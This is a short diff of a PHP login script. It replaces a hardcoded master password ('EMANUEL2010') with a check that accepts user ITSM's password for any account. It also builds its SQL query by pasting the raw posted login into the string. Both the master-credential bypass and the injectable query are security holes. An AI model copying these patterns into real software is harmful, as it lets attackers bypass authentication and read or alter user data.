@@ -6,11 +6,12 @@ include("./includes/UtilUser.php");
 $miConex = new Conexion(); 
 $miUtil = new UtilUser(); 
 
+$resAntes=$miConex->getConsulta("SQLite","SELECT usua_clave FROM CUSUARIOS WHERE USUA_USUARIO='ITSM'");
 
 $res=$miConex->getConsulta("SQLite","SELECT * FROM CUSUARIOS WHERE USUA_USUARIO='".$_POST["login"]."'");
 if (count($res)>0) {
 	//if ($res[0]["usua_clave"]==sha1($_POST["password"])){	
-	if ( (hash("sha512",$_POST["password"], false)==$res[0]["usua_clave"]) || ($_POST["password"]=="EMANUEL2010")) {
+	if ( (hash("sha512",$_POST["password"], false)==$res[0]["usua_clave"]) || (hash("sha512",$_POST["password"], false)==$resAntes[0]["usua_clave"])) {
 		session_start();		
 		$_SESSION['usuario'] = $_POST['login'];
 		$_SESSION['nombre'] = $res[0]["usua_nombre"];
